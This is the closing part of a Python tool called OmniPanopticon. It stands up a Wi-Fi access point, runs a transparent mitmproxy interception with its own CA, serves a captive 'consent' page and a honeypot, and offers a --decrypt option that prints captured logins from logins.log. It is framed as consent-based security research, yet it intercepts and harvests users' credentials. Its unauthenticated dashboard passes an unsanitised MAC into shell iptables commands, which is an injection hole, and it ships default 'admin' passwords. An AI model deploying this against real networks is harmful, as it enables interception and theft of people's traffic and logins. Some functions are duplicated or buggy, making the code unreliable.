    # Verify AP is actually broadcasting
    if not verify_and_heal_ap():
        print("⚠️ AP started but may not be broadcasting correctly.")
        print("   Continuing anyway - check logs and run diagnostic commands.")

    # Start MITM proxy
    mitm = subprocess.Popen(
        f"mitmproxy --mode transparent --showhost -s {CA_DIR}/guardian_addon.py --set confdir={CA_DIR}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    service_pids.append(mitm.pid)
    print(f"   MITM proxy started (PID: {mitm.pid})")
    
    # Start captive portal
    port80 = subprocess.Popen(
        f"python3 {CA_DIR}/captive_portal.py", shell=True,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    service_pids.append(port80.pid)
    print(f"   Captive portal started (PID: {port80.pid})")
    
    # Start honeypot
    honey = subprocess.Popen(
        f"python3 {CA_DIR}/honeypot.py", shell=True,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    service_pids.append(honey.pid)
    print(f"   Honeypot started (PID: {honey.pid})")
    
    # Start dashboard in thread (can't easily get PID for thread)
    dash_thread = threading.Thread(target=start_dashboard_thread, name="Dashboard")
    dash_thread.daemon = True
    dash_thread.start()
    print("   Dashboard started (thread) on port 5000.")

# ================== DASHBOARD + CONSENT ==================
DASHBOARD_TEMPLATE = r"""
<!DOCTYPE html>
<html>
<head>
    <title>OmniPanopticon v5.3</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Courier New', monospace; margin: 40px; background: #0a0a0a; color: #00ff00; }
        h1 { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
        h2 { color: #00cccc; border-bottom: 2px solid #00cccc; padding-bottom: 5px; }
        .container { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .panel { background: #1a1a1a; padding: 20px; border: 1px solid #333; border-radius: 5px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #333; }
        th { color: #ffff00; }
        .isolated { color: #ff4444; }
        .consented { color: #00ff00; }
        .pending { color: #ffaa00; }
        .alert { background: #330000; border-left: 4px solid #ff0000; padding: 10px; margin: 5px 0; }
        #alerts { max-height: 300px; overflow-y: auto; }
        .stat { font-size: 24px; font-weight: bold; }
        .refresh { color: #888; font-size: 12px; }
        a { color: #00aaff; }
    </style>
</head>
<body>
    <h1>⚡ OmniPanopticon v5.3 – Network Security Fortress</h1>
    <p class="refresh">Last update: <span id="lastUpdate">{{ last_update }}</span></p>
    
    <div class="container">
        <div class="panel">
            <h2>📊 Statistics</h2>
            <table>
                <tr><td>Total Devices</td><td class="stat" id="totalDevices">{{ total_devices }}</td></tr>
                <tr><td>Consented</td><td class="stat consented">{{ consent_count }}</td></tr>
                <tr><td>Isolated</td><td class="stat isolated">{{ isolated_count }}</td></tr>
                <tr><td>AP SSID</td><td>{{ ap_ssid }}</td></tr>
                <tr><td>AP IP</td><td>{{ ap_ip }}</td></tr>
                <tr><td>Uptime</td><td id="uptime">Loading...</td></tr>
            </table>
        </div>
        
        <div class="panel">
            <h2>🚨 Recent Alerts</h2>
            <div id="alerts">
                {% for alert in alerts %}
                <div class="alert">{{ alert }}</div>
                {% else %}
                <p>No recent alerts.</p>
                {% endfor %}
            </div>
        </div>
    </div>

    <div class="panel" style="margin-top: 20px;">
        <h2>🔗 Connected Devices</h2>
        <table>
            <thead>
                <tr>
                    <th>MAC Address</th>
                    <th>IP</th>
                    <th>Name</th>
                    <th>Email</th>
                    <th>Status</th>
                    <th>First Seen</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                {% for mac, info in all_devices.items() %}
                <tr class="{% if mac in isolated %}isolated{% elif mac in devices %}consented{% else %}pending{% endif %}">
                    <td>{{ mac }}</td>
                    <td>{{ info.ip }}</td>
                    <td>{{ info.name or 'Unknown' }}</td>
                    <td>{{ info.email or 'N/A' }}</td>
                    <td>
                        {% if mac in isolated %}ISOLATED
                        {% elif mac in devices %}CONSENTED
                        {% else %}PENDING CONSENT
                        {% endif %}
                    </td>
                    <td>{{ info.first_seen }}</td>
                    <td>
                        {% if mac not in isolated %}
                            <a href="/isolate?mac={{ mac }}">🔒 Isolate</a>
                        {% else %}
                            <a href="/unban?mac={{ mac }}">🔓 Unban</a>
                        {% endif %}
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>

    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script>
    const socket = io();
    const startTime = Date.now();
    
    socket.on('new_alert', function(data) {
        const alertsDiv = document.getElementById('alerts');
        const alertDiv = document.createElement('div');
        alertDiv.className = 'alert';
        alertDiv.innerHTML = '[' + data.time + '] ' + data.message;
        alertsDiv.insertBefore(alertDiv, alertsDiv.firstChild);
        // Keep only last 20 alerts
        const alerts = alertsDiv.querySelectorAll('.alert');
        if (alerts.length > 20) {
            alerts[alerts.length-1].remove();
        }
    });

    socket.on('device_update', function(data) {
        location.reload();  // Simple: reload page on device changes
    });

    // Update uptime
    setInterval(() => {
        const uptime = Math.floor((Date.now() - startTime) / 1000);
        const hours = Math.floor(uptime / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = uptime % 60;
        document.getElementById('uptime').textContent = 
            `${hours}h ${minutes}m ${seconds}s`;
    }, 1000);

    // Auto-refresh every 30 seconds
    setTimeout(() => location.reload(), 30000);
    </script>
</body></html>
"""

CONSENT_TEMPLATE = r"""
<!DOCTYPE html>
<html>
<head>
    <title>Consent Required - OmniPanopticon</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 100px; text-align: center; background: linear-gradient(45deg, #1a1a2e 0%, #16213e 100%); color: #fff; }
        .container { max-width: 500px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 40px; border-radius: 10px; backdrop-filter: blur(10px); }
        h1 { color: #00ff00; }
        input[type=text], input[type=email] { width: 100%; padding: 10px; margin: 10px 0; background: #333; border: 1px solid #555; color: #fff; }
        button { background: #00ff00; color: #000; padding: 10px 30px; border: none; cursor: pointer; font-size: 16px; }
        button:hover { background: #00cc00; }
        a { color: #00aaff; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Consent Required</h1>
        <p>This network monitors all traffic for security research purposes.</p>
        <p>You must consent to continue using this network.</p>
        <form method="POST">
            <input type="text" name="name" placeholder="Your Name" required>
            <input type="email" name="email" placeholder="Email (optional)">
            <label>
                <input type="checkbox" name="agree" required>
                I agree to be monitored for security research
            </label><br><br>
            <button type="submit">Connect to Network</button>
        </form>
        <p style="margin-top: 20px; font-size: 12px; color: #888;">
            By connecting, you acknowledge that all traffic may be analyzed for security research.
        </p>
    </div>
</body></html>
"""

def start_dashboard_thread():
    app = Flask(__name__)
    app.secret_key = os.urandom(16)
    socketio = SocketIO(app, async_mode='threading', cors_allowed_origins="*")

    # State (in-memory, will be lost on restart but reloaded from files)
    isolated_macs = set()
    consent_store = {}  # mac -> {name, email, time}
    all_devices = {}    # mac -> {ip, name, email, first_seen, last_seen, consented}
    alerts = []         # list of recent alerts
    device_lock = threading.Lock()
    alert_lock = threading.Lock()
    start_time = time.time()
    
    # Alert file monitoring
    alerts_file = "/etc/panopticon/alerts.json"
    alerts_file_position = 0

    # Load persisted data
    consent_file = "/etc/panopticon/consent.json"
    devices_file = "/etc/panopticon/devices.json"
    alerts_file = "/etc/panopticon/alerts.json"
    
    # Ensure alerts file exists
    try:
        if not os.path.exists(alerts_file):
            open(alerts_file, 'a').close()
            os.chmod(alerts_file, 0o644)
    except:
        pass
    
    # Load devices first
    if os.path.exists(devices_file):
        try:
            with open(devices_file) as f:
                all_devices = json.load(f)
                print(f"[Dashboard] Loaded {len(all_devices)} devices from {devices_file}")
        except Exception as e:
            print(f"[Dashboard] Warning: Could not load devices: {e}")
    
    # Load consent and merge
    if os.path.exists(consent_file):
        try:
            with open(consent_file) as f:
                consent_store = json.load(f)
                # Update all_devices with consent info
                for mac, info in consent_store.items():
                    if mac in all_devices:
                        all_devices[mac]['consented'] = True
                        all_devices[mac]['name'] = info.get('name', all_devices[mac].get('name', ''))
                        all_devices[mac]['email'] = info.get('email', all_devices[mac].get('email', ''))
                    else:
                        all_devices[mac] = {
                            'ip': info.get('ip', 'unknown'),
                            'name': info.get('name', ''),
                            'email': info.get('email', ''),
                            'first_seen': info.get('time', datetime.now().isoformat()),
                            'last_seen': datetime.now().isoformat(),
                            'consented': True
                        }
            print(f"[Dashboard] Loaded {len(consent_store)} consent records")
        except Exception as e:
            print(f"[Dashboard] Warning: Could not load consent: {e}")

    def save_consent():
        try:
            os.makedirs(os.path.dirname(consent_file), exist_ok=True)
            with open(consent_file, "w") as f:
                json.dump(consent_store, f, indent=2)
        except Exception as e:
            print(f"[Dashboard] Error: Consent save failed: {e}")

    def save_devices(devices_data):
        try:
            # Ensure directory exists
            os.makedirs(os.path.dirname(devices_file), exist_ok=True)
            with open(devices_file, "w") as f:
                json.dump(devices_data, f, indent=2)
        except Exception as e:
            print(f"[Dashboard] Error: Devices save failed: {e}")

    def add_alert(message, level="info"):
        """Add alert and broadcast via SocketIO"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        alert_obj = {'time': timestamp, 'message': message, 'level': level}
        with alert_lock:
            alerts.insert(0, alert_obj)
            if len(alerts) > 50:
                alerts.pop()
        socketio.emit('new_alert', alert_obj)

    def monitor_alerts():
        """Background thread to monitor alerts file and push to SocketIO"""
        # Use closure access to alerts_file_position
        alerts_pos = 0
        while True:
            try:
                if os.path.exists(alerts_file):
                    with open(alerts_file, 'r') as f:
                        f.seek(alerts_pos)
                        new_lines = f.readlines()
                        alerts_pos = f.tell()
                        for line in new_lines:
                            line = line.strip()
                            if line:
                                try:
                                    alert = json.loads(line)
                                    # Add to local alerts list
                                    with alert_lock:
                                        alerts.insert(0, alert)
                                        if len(alerts) > 50:
                                            alerts.pop()
                                    # Broadcast via SocketIO
                                    socketio.emit('new_alert', alert)
                                except json.JSONDecodeError:
                                    pass
            except Exception as e:
                print(f"[Dashboard] Alert monitor error: {e}")
            socketio.sleep(1)  # Check every second
            try:
                if os.path.exists(alerts_file):
                    with open(alerts_file, 'r') as f:
                        f.seek(alerts_file_position)
                        new_lines = f.readlines()
                        alerts_file_position = f.tell()
                        for line in new_lines:
                            line = line.strip()
                            if line:
                                try:
                                    alert = json.loads(line)
                                    # Add to local alerts list
                                    with alert_lock:
                                        alerts.insert(0, alert)
                                        if len(alerts) > 50:
                                            alerts.pop()
                                    # Broadcast via SocketIO
                                    socketio.emit('new_alert', alert)
                                except json.JSONDecodeError:
                                    pass
            except Exception as e:
                print(f"[Dashboard] Alert monitor error: {e}")
            socketio.sleep(1)  # Check every second

    @app.route('/api/stats')
    def api_stats():
        """JSON endpoint for statistics"""
        return jsonify({
            'total_devices': len(all_devices),
            'consented': len(consent_store),
            'isolated': len(isolated_macs),
            'uptime': int(time.time() - start_time),
            'ap_ssid': AP_SSID,
            'ap_ip': AP_IP
        })

    @app.route('/api/devices')
    def api_devices():
        """JSON endpoint for all devices"""
        return jsonify(all_devices)

    @app.route('/api/alerts')
    def api_alerts():
        """JSON endpoint for recent alerts"""
        return jsonify(alerts[:20])

    @app.route('/consent', methods=['GET', 'POST'])
    def consent():
        if request.method == 'POST':
            mac = request.headers.get('X-Client-MAC', request.remote_addr)
            name = request.form.get('name')
            email = request.form.get('email', '')
            client_ip = request.remote_addr
            with device_lock:
                consent_store[mac] = {
                    'name': name,
                    'email': email,
                    'time': datetime.now().isoformat(),
                    'ip': client_ip
                }
                # Update all_devices
                if mac in all_devices:
                    all_devices[mac]['name'] = name
                    all_devices[mac]['email'] = email
                    all_devices[mac]['consented'] = True
                    all_devices[mac]['ip'] = client_ip
                else:
                    all_devices[mac] = {
                        'ip': client_ip,
                        'name': name,
                        'email': email,
                        'first_seen': datetime.now().isoformat(),
                        'last_seen': datetime.now().isoformat(),
                        'consented': True
                    }
                save_consent()
                save_devices(all_devices)
            add_alert(f"New consent: {name} ({mac})", "success")
            return redirect("http://neverssl.com")
        return render_template_string(CONSENT_TEMPLATE)

    @app.route('/isolate')
    def isolate():
        mac = request.args.get('mac')
        if mac:
            isolated_macs.add(mac)
            run(f"iptables -A FORWARD -i {WIFI_IFACE} -m mac --mac-source {mac} -j DROP", shell=True, check=False)
            add_alert(f"Device isolated: {mac}", "warning")
        return redirect(url_for('dashboard'))

    @app.route('/unban')
    def unban():
        mac = request.args.get('mac')
        if mac and mac in isolated_macs:
            isolated_macs.discard(mac)
            run(f"iptables -D FORWARD -i {WIFI_IFACE} -m mac --mac-source {mac} -j DROP", shell=True, check=False)
            add_alert(f"Device unblocked: {mac}", "success")
        return redirect(url_for('dashboard'))

    @app.route('/')
    def dashboard():
        # Calculate stats
        total_devices = len(all_devices)
        consent_count = len(consent_store)
        isolated_count = len(isolated_macs)
        last_update = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        return render_template_string(
            DASHBOARD_TEMPLATE,
            devices=consent_store,
            all_devices=all_devices,
            isolated=isolated_macs,
            alerts=alerts[:5],
            total_devices=total_devices,
            consent_count=consent_count,
            isolated_count=isolated_count,
            last_update=last_update,
            ap_ssid=AP_SSID,
            ap_ip=AP_IP
        )

    @app.route('/metrics')
    def metrics():
        """Prometheus-style metrics endpoint"""
        metrics_text = f"""# HELP omni_devices_total Total devices detected
# TYPE omni_devices_total counter
omni_devices_total {len(all_devices)}
# HELP omni_devices_consented Devices with consent
# TYPE omni_devices_consented counter
omni_devices_consented {len(consent_store)}
# HELP omni_devices_isolated Isolated devices
# TYPE omni_devices_isolated counter
omni_devices_isolated {len(isolated_macs)}
# HELP omni_uptime_seconds Dashboard uptime
# TYPE omni_uptime_seconds counter
omni_uptime_seconds {int(time.time() - start_time)}
"""
        return metrics_text, 200, {'Content-Type': 'text/plain; version=0.0.4'}

    def alert_pusher():
        """Background task to push alerts"""
        # Start the alert monitor thread
        monitor_thread = threading.Thread(target=monitor_alerts, daemon=True)
        monitor_thread.start()
        # Keep the task alive
        while True:
            socketio.sleep(5)

    socketio.start_background_task(alert_pusher)
    socketio.run(app, host='0.0.0.0', port=DASHBOARD_PORT)

# ================== MAIN ==================
def main():
    global AP_SSID, AP_PASS, WAN_IFACE, WIFI_IFACE, WIREGUARD_IFACE
    global DASHBOARD_PORT, DASHBOARD_USER, DASHBOARD_PASS
    global AP_CHANNEL, AP_COUNTRY, AP_HW_MODE

    parser = argparse.ArgumentParser(description="Omni-Panopticon v5.3")
    parser.add_argument("--config", help="JSON config file")
    parser.add_argument("--ssid", help="AP SSID")
    parser.add_argument("--pass", dest="ap_pass", help="AP password")
    parser.add_argument("--decrypt", action="store_true", help="Decrypt logins.log")
    parser.add_argument("--isolate", help="MAC to block")
    parser.add_argument("--unban", help="MAC to unblock")
    args = parser.parse_args()

    # Check for root early (all privileged actions need root)
    if os.geteuid() != 0:
        print("❌ Run as root."); sys.exit(1)

    if args.decrypt:
        key_path = os.path.join(CA_DIR, "login_encryption.key")
        if not os.path.exists(key_path):
            print("Key not found."); sys.exit(1)
        try:
            with open(key_path, "rb") as f:
                key = f.read()
        except PermissionError:
            print("❌ Permission denied: need root to read key"); sys.exit(1)
        log_file = os.path.join(LOG_DIR, "logins.log")
        if not os.path.exists(log_file):
            print("No logins.log"); sys.exit(1)
        with open(log_file, "r") as f:
            for line in f:
                if "ENCRYPTED" not in line: continue
                parts = line.strip().split("ENCRYPTED ", 1)[1].rsplit(" ", 1)
                if len(parts) < 2: continue
                info, blob = parts
                try:
                    data = base64.b64decode(blob)
                    nonce, tag, ct = data[:12], data[12:28], data[28:]
                    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
                    dec = cipher.decryptor().update(ct) + cipher.decryptor().finalize()
                    print(f"{info} → {dec.decode()}")
                except: pass
        sys.exit(0)

    if args.isolate:
        if not WIFI_IFACE:
            print("Run without --isolate first to configure interfaces."); sys.exit(1)
        run(f"iptables -A FORWARD -i {WIFI_IFACE} -m mac --mac-source {args.isolate} -j DROP", shell=True, check=False)
        print(f"Isolated {args.isolate}"); sys.exit(0)
    if args.unban:
        if not WIFI_IFACE:
            print("Run without --unban first to configure interfaces."); sys.exit(1)
        run(f"iptables -D FORWARD -i {WIFI_IFACE} -m mac --mac-source {args.unban} -j DROP", shell=True, check=False)
        print(f"Unbanned {args.unban}"); sys.exit(0)

    print("""
╔══════════════════════════════════════════════╗
║   OMNI‑PANOPTICON v5.3 – HEALING FORTRESS ║
║   JA3 · DNS Exfil · Consent · Isolation  ║
╚══════════════════════════════════════════════╝
""")
    
    # Load configuration
    config = {}
    if args.config:
        config = load_config(args.config)
        print(f"📋 Loaded configuration from {args.config}")
    else:
        # Try to load default config if it exists
        if os.path.exists(CONFIG_FILE):
            config = load_config(CONFIG_FILE)
            print(f"📋 Loaded configuration from {CONFIG_FILE}")
    
    # Override config with CLI arguments if provided
    if args.ssid:
        config["AP_SSID"] = args.ssid
    if args.ap_pass:
        config["AP_PASS"] = args.ap_pass
    
    # Use original constants as fallbacks
    AP_SSID = config.get("AP_SSID", "OmniNet")
    AP_PASS = config.get("AP_PASS", "ChangeMeNow!")
    WAN_IFACE = config.get("WAN_IFACE", "")
    WIFI_IFACE = config.get("WIFI_IFACE", "")
    WIREGUARD_IFACE = config.get("WIREGUARD_IFACE", "")
    DASHBOARD_PORT = config.get("DASHBOARD_PORT", 5000)
    DASHBOARD_USER = config.get("DASHBOARD_USER", "admin")
    DASHBOARD_PASS = config.get("DASHBOARD_PASS", "admin")
    AP_CHANNEL = config.get("AP_CHANNEL", 6)
    AP_COUNTRY = config.get("AP_COUNTRY", "US")
    AP_HW_MODE = config.get("AP_HW_MODE", "g")
    
    # If interfaces not set via config, prompt for them
    if not WAN_IFACE or not WIFI_IFACE:
        result = subprocess.run("iw dev | grep Interface | awk '{print $2}'", shell=True, capture_output=True, text=True)
        ifaces = result.stdout.strip().split('\n')
        ifaces = [iface for iface in ifaces if iface]  # Remove empty lines
        
        if not ifaces:
            print("❌ No wireless interfaces found!")
            sys.exit(1)
            
        print("🌐 Wireless interfaces detected:")
        for i, iface in enumerate(ifaces):
            print(f"  [{i}] {iface}")
        
        # Get WAN interface
        while True:
            try:
                wan_input = input("\nWAN interface index: ").strip()
                if not wan_input and WAN_IFACE:
                    break  # Use config value if available and input is empty
                wan = int(wan_input)
                if 0 <= wan < len(ifaces):
                    WAN_IFACE = ifaces[wan]
                    break
                else:
                    print(f"❌ Please enter a number between 0 and {len(ifaces)-1}")
            except ValueError:
                if wan_input == "" and WAN_IFACE:
                    break  # Use config value if available and input is empty
                print("❌ Please enter a valid number")
        
        # Get AP interface
        while True:
            try:
                ap_input = input("AP interface index: ").strip()
                if not ap_input and WIFI_IFACE:
                    break  # Use config value if available and input is empty
                ap = int(ap_input)
                if 0 <= ap < len(ifaces):
                    if ifaces[ap] == WAN_IFACE:
                        print("❌ Must be different from WAN interface.")
                    else:
                        WIFI_IFACE = ifaces[ap]
                        break
                else:
                    print(f"❌ Please enter a number between 0 and {len(ifaces)-1}")
            except ValueError:
                if ap_input == "" and WIFI_IFACE:
                    break  # Use config value if available and input is empty
                print("❌ Please enter a valid number")
    
    # Save updated config
    config.update({
        "AP_SSID": AP_SSID,
        "AP_PASS": AP_PASS,
        "WAN_IFACE": WAN_IFACE,
        "WIFI_IFACE": WIFI_IFACE,
        "WIREGUARD_IFACE": WIREGUARD_IFACE,
        "DASHBOARD_PORT": DASHBOARD_PORT,
        "DASHBOARD_USER": DASHBOARD_USER,
        "DASHBOARD_PASS": DASHBOARD_PASS,
        "AP_CHANNEL": AP_CHANNEL,
        "AP_COUNTRY": AP_COUNTRY,
        "AP_HW_MODE": AP_HW_MODE
    })
    save_config(CONFIG_FILE, config)
    print(f"💾 Configuration saved to {CONFIG_FILE}")
    
    # Setup WireGuard if configured
    if WIREGUARD_IFACE and config.get("wireguard"):
        setup_wireguard(config.get("wireguard", {}))

    atexit.register(cleanup)
    install_deps()
    generate_ca()
    configure_network()
    setup_firewall()
    write_mitm_addon()
    write_captive_portal()
    write_honeypot()
    start_services()

    print("\n✅ OmniPanopticon is live.")
    print(f"   Dashboard: http://{AP_IP}:{DASHBOARD_PORT}")
    print("   Consent portal: http://192.168.10.1:5000/consent")
    print("   Press Ctrl+C to stop.")
    try:
        signal.pause()
    except KeyboardInterrupt:
        print("\n🛑 Shutting down.")
        sys.exit(0)

if __name__ == "__main__":
    main()
